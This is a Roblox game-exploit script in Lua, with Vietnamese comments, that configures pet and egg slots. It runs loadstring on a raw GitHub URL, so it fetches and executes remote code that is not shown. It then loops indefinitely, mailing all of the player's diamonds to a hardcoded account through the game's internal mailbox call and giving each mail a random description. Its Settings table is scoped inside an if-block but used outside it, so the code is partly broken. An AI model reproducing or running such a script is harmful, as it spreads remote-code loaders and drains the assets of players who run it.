getgenv().Config = {
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '>1000' },
        HOUSE3 = { '6000~14000', '>25000' },
        HOUSE4 = { '14000~20000' },
        HOUSE5 = { '>24000' },
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7 , 8, 9}, -- slot dành cho pet
        EGG_SLOTS = { 10 }, -- slot dành cho trứng
    },
    Usernames = { 'DreamSoCow' }, -- Danh sách người nhận
    PetSendInterval = 10, -- Thời gian quét và gửi lại (giây)
    MinDiamonds = 70000000, -- Gửi khi kim cương > số này
    Receivers = { 'DreamSoCow' }, -- Danh sách người nhận
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/track.lua"))()
wait(2)
--============= MAILING DIAMONDS ============================
for i = 1,10 do print() end

if not LPH_OBFUSCATED then
    local Settings = {
        Mailing = {
            ["Diamonds"] = {
                Class = "Currency",
                Amount = "All",
                MinDiamonds = 50000000
            },
        },
        Users = {
            "DreamSoCow",
        },
        ["Split Items Evenly"] = false,
        ["Only Online Accounts"] = false,
        ["Developer Mode"] = false,
        [[ Thank you for using System Exodus <3! ]]
    }
end

if not game:IsLoaded() then game.Loaded:Wait() end

local M_Players = game:GetService("Players")
local M_ReplicatedStorage = game:GetService("ReplicatedStorage")
local M_HttpService = game:GetService("HttpService")
local M_LocalPlayer = M_Players.LocalPlayer

local M_Library = {}
local M_Client = {}
for _,v in next, M_ReplicatedStorage.Library.Client:GetChildren() do
    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
        local ok, mod = pcall(function() return require(v) end)
        if ok then M_Library[v.Name] = mod M_Client[v.Name] = mod end
    end
end
for _,v in next, M_ReplicatedStorage.Library:GetChildren() do
    if v:IsA("ModuleScript") and not v:GetAttribute("NOLOAD") then
        local ok, mod = pcall(function() return require(v) end)
        if ok then M_Library[v.Name] = mod end
    end
end

local M_NormalLibrary = M_ReplicatedStorage.Library
local M_PlayerSave = require(M_NormalLibrary.Client.Save)

local function M_GetDiamonds(ReturnUID)
    for i,v in next, M_PlayerSave.Get()["Inventory"].Currency do
        if v.id == "Diamonds" then
            return ReturnUID and i or v._am
        end
    end
    return 0
end

local function M_GenerateDescription()
    local AdjectiveList = {
        "Bold","Quick","Happy","Tiny","Brave","Clever","Gentle",
        "Mighty","Calm","Loyal","Bright","Wise","Fearless","Vivid"
    }
    local NounList = {
        "Lion","Castle","Book","Cloud","Tiger","Forest","River",
        "Sword","Galaxy","Phoenix","Knight","Star","Dragon"
    }
    return AdjectiveList[math.random(#AdjectiveList)] .. " " .. NounList[math.random(#NounList)]
end

local function M_SendMail(Username, Class, UID, Amount)
    local success, result = pcall(function()
        return M_Library.Network.Invoke("Mailbox: Send", Username, M_GenerateDescription(), Class, UID, Amount)
    end)
    if result then
        print(string.format("[Mailing] 💌 Sent %s %s to %s", tostring(Amount), Class, Username))
        Settings.MailCost = 0
        Settings.DiamondsAvailable = math.floor(M_GetDiamonds() - Settings.MailCost)
    else
        warn("[Mailing] ❌ Send failed, retrying in 3s...")
        task.wait(3)
        return M_SendMail(Username, Class, UID, Amount)
    end
    return result
end

-- 💠 AUTO GỬI DIAMONDS
task.spawn(function()
    print("[Mailing] 🚀 Auto gửi Diamonds bắt đầu…")

    while task.wait(40) do
        local DiamondsNow = M_GetDiamonds()
        local MinDiamonds = (Settings.Mailing.Diamonds.MinDiamonds or 0)
        local UID = M_GetDiamonds(true)

        if DiamondsNow >= MinDiamonds then
            local MailCost = Settings.MailCost or 0
            local Sendable = math.max(0, DiamondsNow - MailCost)

            if Sendable > 0 then
                for _, Username in next, Settings.Users do
                    M_SendMail(Username, "Currency", UID, Sendable)
                end
            end
        end
    end
end)
